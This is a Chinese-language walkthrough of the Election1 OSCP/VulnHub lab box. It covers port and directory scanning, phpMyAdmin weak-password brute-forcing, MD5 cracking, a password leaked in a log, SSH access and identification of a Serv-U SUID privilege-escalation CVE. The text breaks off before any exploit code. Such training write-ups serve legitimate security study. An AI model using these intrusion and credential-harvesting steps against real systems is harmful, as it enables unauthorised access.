---
title: OSCP官方靶场-Election1-WP
url: https://mp.weixin.qq.com/s/qJNdz6kUoSlpkhsTuX4Kxw
source: Doonsec's feed
date: 2026-03-13
fetch_date: 2026-03-14T04:10:47.852126
---

# OSCP官方靶场-Election1-WP

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/teQhPZBEOpPUbicKM7mkuAcLK8pkBxpMA3dLNbqxlfmc7dszevSvG3glicbsY91Ttebg1YCnoInMwaanEaKI3JDBaH8dz5o4CTb2RFqaGEebU/0?wx_fmt=jpeg)

# OSCP官方靶场-Election1-WP

原创

泷羽Sec-静安
泷羽Sec-静安

泷羽Sec-静安

![]()

在小说阅读器中沉浸阅读

> 关注**泷羽Sec**和**泷羽Sec-静安**公众号，这里会定期更新与 OSCP、渗透测试等相关的最新文章，帮助你理解网络安全领域的最新动态。后台回复“OSCP配套工具”获取本文的工具

代理链接VPN

```
proxychains sudo openvpn universal.ovpn
```

官网打开靶场或链接地址下载虚拟镜像：

> https://www.vulnhub.com/entry/election-1,503/

## 信息收集

```
# Kali攻击机地址
192.168.45.168
# 靶机地址
192.168.195.211
```

### 扫描端口和目录

```
# 设置MTU
sudo ip link set dev tun0 mtu 1250
ip link show tun0
# 扫描端口
ports=$(sudo nmap -p- --min-rate=5000 -Pn 192.168.195.211 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
echo $ports
# 扫描服务
sudo nmap -sT -sC -sV -O -Pn -p$ports 192.168.195.211
sudo nmap --script=vuln -p$ports -Pn 192.168.195.211
# 扫描目录
gobuster dir -e -u http://192.168.195.211 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,html,txt -b 403,500,404 -z
whatweb http://192.168.195.211/
```

扫描结果如下：

```
┌──(kali㉿kali)-[~]
└─$ ports=$(sudo nmap -p- --min-rate=5000 -Pn 192.168.195.211 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

┌──(kali㉿kali)-[~]
└─$ echo $ports
22,80,15552,17682,34185,35675

┌──(kali㉿kali)-[~]
└─$ sudo nmap -sT -sC -sV -O -Pn -p$ports 192.168.195.211
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-13 01:55 -0400
Nmap scan report for 192.168.195.211
Host is up (0.22s latency).

PORT      STATE  SERVICE VERSION
22/tcp    open   ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 20:d1:ed:84:cc:68:a5:a7:86:f0:da:b8:92:3f:d9:67 (RSA)
|   256 78:89:b3:a2:75:12:76:92:2a:f9:8d:27:c1:08:a7:b9 (ECDSA)
|_  256 b8:f4:d6:61:cf:16:90:c5:07:18:99:b0:7c:70:fd:c0 (ED25519)
80/tcp    open   http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
15552/tcp closed unknown
17682/tcp closed unknown
34185/tcp closed unknown
35675/tcp closed unknown
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.84 seconds

┌──(kali㉿kali)-[~]
└─$ sudo nmap --script=vuln -p$ports -Pn 192.168.195.211
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-13 01:56 -0400
Nmap scan report for 192.168.195.211
Host is up (0.23s latency).

PORT      STATE  SERVICE
22/tcp    open   ssh
80/tcp    open   http
|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.'
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum:
|   /robots.txt: Robots file
|   /phpinfo.php: Possible information file
|_  /phpmyadmin/: phpMyAdmin
15552/tcp closed unknown
17682/tcp closed unknown
34185/tcp closed unknown
35675/tcp closed unknown

Nmap done: 1 IP address (1 host up) scanned in 265.92 seconds
```

主页是个配置页面没什么
![](https://mmbiz.qpic.cn/mmbiz_png/teQhPZBEOpPMmnC0UdI0AfSJHDNgt0HcodCOVZ1T18uGpf056vqciaTApLDppNlYDV3kibWiahyfyM2ppRfI2o75921u4IPIJ7XbhcEYoAXClw/640?wx_fmt=png&from=appmsg)
查看robots.txt 发现隐藏目录
![](https://mmbiz.qpic.cn/sz_mmbiz_png/teQhPZBEOpOrGGCN5EhLsJVxyQlfMpIwhvjDZ5mgRA4BYs5NvZsBfsYdmX3QcNbjXeATiaH7wwbaE4sYeBLvELdrjFVrHQA5AqW1T4Lx72oo/640?wx_fmt=png&from=appmsg)

```
admin
wordpress
user
election
```

打开目录是一个投票页面
![](https://mmbiz.qpic.cn/sz_mmbiz_png/teQhPZBEOpMia4FDtwl5WGfMEVV0A35hYO7hoYGWasicDTDN0wslgiaBX2ibuAk4cQWiasOayaCMnE6rq4ED5IcnJMqIkpW55MibDh10tGOJRcibnQ/640?wx_fmt=png&from=appmsg)
提示登录admin后给候选人投票根据Nmap扫描结果发现有php页面，看到还开放了文件包含
![](https://mmbiz.qpic.cn/sz_mmbiz_png/teQhPZBEOpN6EFN7w0BfciaiaLBLJOlSsdsba4yYPfuJic1dFLRn3kXyQlpYuKQuqggFSNsD4WfwEhWk4jjVpKVKHCl02X8cAjNKGvLMicA3DFc/640?wx_fmt=png&from=appmsg)

Nmap扫描发现phpmyadmin后台管理页面

![](https://mmbiz.qpic.cn/mmbiz_png/teQhPZBEOpPt9ghj9iaosaLMrEO8ogSKfQ3KQxhjVZwE2LJNgAM56PYgUylts813xC74WfQp0Aia27zM0ryoKeGbfUMMXoQnnvNLVD99cTXdM/640?wx_fmt=png&from=appmsg)

## phpMyAdmin 弱密码登录

爆破弱密码使用

> https://github.com/bmth666/phpMyAdminCrack.git

复制一个字典过来

```
cp  /usr/share/wordlists/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt ./wordlists/password.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/teQhPZBEOpNzNkjlvAUBaDKvJiaOXr4pHx7RgosV1Eic00xqckOFtVLrWvo7k9b6m54O2tHjBTZYAiczMNTqibmN9PqBvJmMPo4uSHWjUIyQ8BI/640?wx_fmt=png&from=appmsg)

弱密码登录即可

```
 root toor
```

![](https://mmbiz.qpic.cn/mmbiz_png/teQhPZBEOpNv4icT4vYics8ibhozjvovvA5P9lj845fqSpAxOj5N3M12mUBntdXuMrv7Ja5hTutn9MuXCanBTsQv7ibI08wQLuYOdDGbCfQBcJw/640?wx_fmt=png&from=appmsg)
发现存在疑似用户id和密码的表
![](https://mmbiz.qpic.cn/mmbiz_png/teQhPZBEOpMsumFadADx9UqDmc7yRsnibmibJmHus7RwTIVQ20EqXTneRwvoKsGDTY1vDCR9txib8P0AAtArbNmjUsh9GnT7gPfiaAJClm1CxAo/640?wx_fmt=png&from=appmsg)
解码这个md5得到一个密码

```
bb113886b0513a9d882e3caa5cd73314
```

![](https://mmbiz.qpic.cn/mmbiz_png/teQhPZBEOpNsSiaALVrEzd3kvfC6BefGecYNhTfr9AS7UU5LdQ9VChTNGRTd1VKia3r33S3RibyKLjDWfQ8aCo2jLIxY6XicFLPlL8yBjiatiaM7g/640?wx_fmt=png&from=appmsg)
此时我们得到的信息是

| id | no\_induk | nama | level | password |
| --- | --- | --- | --- | --- |
| 1 | 1234 | Love | 1 | bb113886b0513a9d882e3caa5cd73314 |

```
1234   Love Zxc123!@#
```

## 投票系统log泄露密码

把投票页面补全admin，http://192.168.195.211/election/admin 尝试登陆到后台发现要输入ID，就输入1234

![](https://mmbiz.qpic.cn/mmbiz_png/teQhPZBEOpPsicSMxxZu1HZf4lJ7LNic8LKTdwt1XKlGSNFWKdhiabqALvnNPt1HzRVdYHUr2WWgibIk4rq4t3HRzoHhnx9KHZAibQUWVKq5FNNY/640?wx_fmt=png&from=appmsg)
在输入密码 Zxc123!@#
![](https://mmbiz.qpic.cn/mmbiz_png/teQhPZBEOpMJnibAFKKWbLb7nBvB2UIIUyy3qT9PbUSHShk5axfHh4FPthSqFrRY6svmicVAze3Fu7go4LHxJTW0QZoIzicjcbZ6YJZB2wNrrc/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/teQhPZBEOpPudjQshCP7iaF69JFqT6XLwHLXKrmy4lMnLhGwUAFlQ7XDXOB86b4srdVuWfR0C1ArorDH691Fib7Jl5XRibNiaoIB3Tr8y4PDwuY/640?wx_fmt=png&from=appmsg)
系统设置里面有个查看log的选项，点开查看发现泄露的密码。
![](https://mmbiz.qpic.cn/mmbiz_png/teQhPZBEOpNmbBXicWF2vj8CNR30HicLYoUDlkHGvWg05tzdPxTyDibuvxdlibWicMXWh9qQdTtPZLhE9fYxVAgnbZUmNwpr8PkWvxJtlwygQ0Ss/640?wx_fmt=png&from=appmsg)
结合之前的Nmap扫描结果，怀疑这个密码是ssh登录的密码

```
Assigned Password for the user love: P@$$w0rd@123
```

## SSH登录

### 获得local.txt的flag

```
ssh love@192.168.195.211
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/teQhPZBEOpMcko5771EeMWMJ0Cnn59zIN9CtCZfQyeqzK4Lfg0S9NFYH7FibRcRhnFicB92Bf7zKVgiavUGkicqKSia9ibmaicJ6krw9EBuZ0ib7HJA/640?wx_fmt=png&from=appmsg)

### 提权root

查找提权点

```
find / -type f -perm -u=s 2>/dev/null
```

![](https://mmbiz.qpic.cn/mmbiz_png/teQhPZBEOpOLXVa2R67fW7uj89ciblNUhxKcricqGf1vO1c9fCoBkrYIAaupdnfCmsmOwx0GFibuoR8kE1tTMyf6J9YkLa9dDZIwoOREPCN60M/640?wx_fmt=png&from=appmsg)
发现异常文件

```
/usr/local/Serv-U/Serv-U
```

尝试运行
![](https://mmbiz.qpic.cn/sz_mmbiz_png/teQhPZBEOpOd05nBsyA743BnxlAexo5N76IXq2UBibRbRokA4PUwHHcglqoTq8nKApvibTt0Sf87kutJ5ZhwKpKibibYbEMIdgkC895cFTzggibY/640?wx_fmt=png&from=appmsg)
查看所在目录，发现版本信息文件
![](https://mmbiz.qpic.cn/sz_mmbiz_png/teQhPZBEOpNScibUsW6ljw20oSa1T9EfYiahRJbgSgWEbWMlRRjBmCkaNBRIcLsCJbHBAAXQtj0EibvqsQEjHXMksl14tZOBcwWlaVUibM7juZo/640?wx_fmt=png&from=appmsg)
提示了软件版本号 `Serv-U File Server (64-bit) - Version 15.1 (15.1.6.25)`，搜索相关漏洞![](https://mmbiz.qpic.cn/sz_mmbiz_png/teQhPZBEOpMwibHkKoMztr5f4wrUtFNYvbfCmdet61vJknmUgLRm120IwNwEmiaTPsDeE9S9I1VOfXNqiaf3wMlCibfga3Xibb086TiaGqeVOgPog/640?wx_fmt=png&from=appmsg)

发现两个Poc均指向漏洞编号 CVE-2019-12181

> https://github.com/trickest/cve/blob/main/2019/CVE-2019-12181.md

![](https://mmbiz.qpic.cn/sz_mmbiz_png/teQhPZBEOpOjicPvfVamMquo8dtNaQPG401JctuPQBEgbZmskFS6R1Fiaau8PzyO6xGmV2RzFELwP2LX7vx7icXZiaD8DbwLrARSe5CalWyK3U8/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/teQhPZBEOpO9aVHBZiaHOCUfqUm9LQn3Jy5TFHomptPwqf24LGbb89KZ3kHn7ZadxHyXzbVUmukwgFjicc8...